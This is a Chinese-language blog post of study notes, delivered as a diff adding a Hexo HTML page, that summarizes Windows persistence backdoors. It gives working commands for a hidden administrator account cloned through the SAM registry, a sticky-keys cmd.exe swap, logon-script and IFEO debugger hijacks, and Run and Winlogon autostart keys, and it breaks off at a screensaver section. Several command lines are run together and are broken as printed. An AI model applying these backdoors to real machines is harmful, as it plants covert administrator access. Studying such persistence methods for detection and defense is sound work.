@@ -1,0 +1,1477 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+<script>
+
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+
+</script>
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/hacker-32x32.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/hacker-16x16.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="学习笔记,Windows权限维持," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Ax-x" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="一、影子账户1.使用如下命令创建隐藏用户并加入管理员组 1net user test$ 123456 &#x2F;addnet localgroup administrators test$ &#x2F;add">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows权限维持总结">
+<meta property="og:url" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="Ax-x">
+<meta property="og:description" content="一、影子账户1.使用如下命令创建隐藏用户并加入管理员组 1net user test$ 123456 &#x2F;addnet localgroup administrators test$ &#x2F;add">
+<meta property="og:locale">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027220114.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027221115.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027221116.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027222117.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027222118.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027222119.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027222120.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027222121.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027222122.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027222123.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027222124.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027222125.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027222126.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027222127.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027223128.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027223129.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027223130.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027223131.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027223132.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027223133.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027223134.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027223135.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027223136.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027224137.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027224138.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027224139.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027224140.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027224141.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027224142.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027224143.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027224144.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027224145.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027224146.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027224147.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027225148.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027225149.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027225150.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027225151.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027225152.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027225153.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027225154.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027225155.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027225156.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027225157.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027225158.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027225159.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027225160.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027225161.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027225162.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027225163.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027226164.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027226165.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027226166.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027226167.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027226168.webp">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027226169.webp">
+<meta property="article:published_time" content="2023-04-18T16:08:48.000Z">
+<meta property="article:modified_time" content="2023-04-18T16:11:14.073Z">
+<meta property="article:author" content="Ax-x">
+<meta property="article:tag" content="学习笔记">
+<meta property="article:tag" content="Windows权限维持">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640.webp">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://ax-x.github.io/2023/04/19/Windows权限维持总结/"/>
+
+
+
+
+
+  <title>Windows权限维持总结 | Ax-x</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Ax-x</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">以有限的时间，做无限的事情</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-schedule">
+          <a href="/schedule/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-calendar"></i> <br />
+            
+            日程表
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/head_portrait.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ax-x">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Windows权限维持总结</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2023-04-19T00:08:48+08:00">
+                2023-04-19
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2023-04-19T00:11:14+08:00">
+                2023-04-19
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%86%85%E7%BD%91/" itemprop="url" rel="index">
+                    <span itemprop="name">内网</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  3k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  12
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h4 id="一、影子账户"><a href="#一、影子账户" class="headerlink" title="一、影子账户"></a><strong>一、影子账户</strong></h4><p>1.使用如下命令创建隐藏用户并加入管理员组</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user test<span class="variable">$</span> <span class="number">123456</span> /addnet localgroup administrators test<span class="variable">$</span> /add</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+<p>创建成功后使用net user命令无法查看到此用户，但是在计算机管理页面中还是可以看到，需要通过修改注册表来隐藏。</p>
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640.webp" alt="图片"></p>
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027220114.webp" alt="图片"></p>
+<p>2.打开注册表（HKEY_LOCAL_MACHINE\SAM\SAM）</p>
+<p>修改SAM权限，赋予adminitrators完全控制权限。</p>
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027221115.webp" alt="图片"></p>
+<p>3.将Administrator用户对应项的F数据值复制到test$用户对应项的F数据值。</p>
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027221116.webp" alt="图片"></p>
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027222117.webp" alt="图片"></p>
+<p>4.将test$和所对应项000003F1导出，分别命名为test.reg和1.reg</p>
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027222118.webp" alt="图片"></p>
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027222119.webp" alt="图片"></p>
+<p>5.删除test$用户，将test.reg和1.reg导入注册表</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user test<span class="variable">$</span> /delregedit /s test.regregedit /s <span class="number">1</span>.reg</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027222120.webp" alt="图片"></p>
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027222121.webp" alt="图片"></p>
+<p>6.此时在用户组已经看不到test$用户，只能在注册表中能看到。</p>
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027222122.webp" alt="图片"></p>
+<h4 id="二、粘滞键后门"><a href="#二、粘滞键后门" class="headerlink" title="二、粘滞键后门"></a><strong>二、粘滞键后门</strong></h4><p>粘滞键指的是电脑使用中的一种快捷键，专为同时按下两个或多个键有困难的人而设计的。粘滞键的主要功能是方便Shift等键的组合使用。一般的电脑连按五次shift会出现粘滞键提示。</p>
+<p><strong>演示：</strong></p>
+<p>粘滞键位置：c:\windows\system32\sethc.exe</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">move</span> sethc.exe sethc1.execopy cmd.exe sethc.exe</span><br></pre></td></tr></table></figure>
+
+<p>此时连按五次shift键即可启动cmd，而且不需要登录就可以执行。</p>
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027222123.webp" alt="图片"></p>
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027222124.webp" alt="图片"></p>
+<h4 id="三、logon-scripts后门"><a href="#三、logon-scripts后门" class="headerlink" title="三、logon scripts后门"></a><strong>三、logon scripts后门</strong></h4><p>Windows登录脚本，当用户登录时触发，Logon Scripts能够优先于杀毒软件执行，绕过杀毒软件对敏感操作的拦截。</p>
+<p><strong>演示：</strong></p>
+<p>注册表位置：HKEY_CURRENT_USER\Environment</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">REG ADD <span class="string">&quot;HKEY_CURRENT_USER\Environment&quot;</span> /v UserInitMprLogonScript /t REG_SZ /d <span class="string">&quot;C:\666.exe&quot;</span>    </span><br><span class="line"><span class="comment">#创建键为：UserInitMprLogonScript，其键值为我们要启动的程序路径</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027222125.webp" alt="图片"></p>
+<p>重启，上线成功。</p>
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027222126.webp" alt="图片"></p>
+<h4 id="四、映像劫持"><a href="#四、映像劫持" class="headerlink" title="四、映像劫持"></a><strong>四、映像劫持</strong></h4><p>“映像劫持”，也被称为“IFEO”（Image File Execution Options），在WindowsNT架构的系统里，IFEO的本意是为一些在默认系统环境中运行时可能引发错误的程序执行体提供特殊的环境设定。当一个可执行程序位于IFEO的控制中时，它的内存分配则根据该程序的参数来设定，而WindowsN T架构的系统能通过这个注册表项使用与可执行程序文件名匹配的项目作为程序载入时的控制依据，最终得以设定一个程序的堆管理机制和一些辅助机制等。出于简化原因，IFEO使用忽略路径的方式来匹配它所要控制的程序文件名，所以程序无论放在哪个路径，只要名字没有变化，它就运行出问题。</p>
+<p><strong>演示：</strong></p>
+<p>注册表位置：HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\</p>
+<p>在此注册表位置添加项sethc.exe，添加debugger键的值为c:\windows\system32\cmd.exe</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot;</span> /v <span class="string">&quot;Debugger&quot;</span> /t REG_SZ /d <span class="string">&quot;c:\windows\system32\cmd.exe&quot;</span> /f</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027222127.webp" alt="图片"></p>
+<p>此时点击五次shift键会打开cmd。</p>
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027223128.webp" alt="图片"></p>
+<h4 id="五、注册表自启动后门"><a href="#五、注册表自启动后门" class="headerlink" title="五、注册表自启动后门"></a><strong>五、注册表自启动后门</strong></h4><p>位置一：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</p>
+<p>添加键test，值为后门程序路径。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD <span class="string">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;</span> /v test1 /t REG_SZ /d <span class="string">&quot;C:\666.exe&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027223129.webp" alt="图片"></p>
+<p>重新启动会自动运行后门程序。</p>
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027223130.webp" alt="图片"></p>
+<p>位置二：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</p>
+<p>修改键Userinit的值，重启就会自动运行程序。</p>
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027223131.png" alt="图片"></p>
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027223132.webp" alt="图片"></p>
+<h4 id="六、屏幕保护程序后门"><a href="#六、屏幕保护程序后门" class="headerlink" title="六、屏幕保护程序后门"></a><strong>六、屏幕保护程序后门</strong></h4><p>屏幕保护是Windows功能的一部分，使用户可以在一段时间不活动后放置屏幕消息或图形动画。Windows的此功能被威胁参与者滥用为持久性方法。这是因为屏幕保护程序是具有.scr文件扩展名的可执行文件，并通过scrnsave.scr实用程序执行。</p>
+<p><strong>演示：</strong></p>
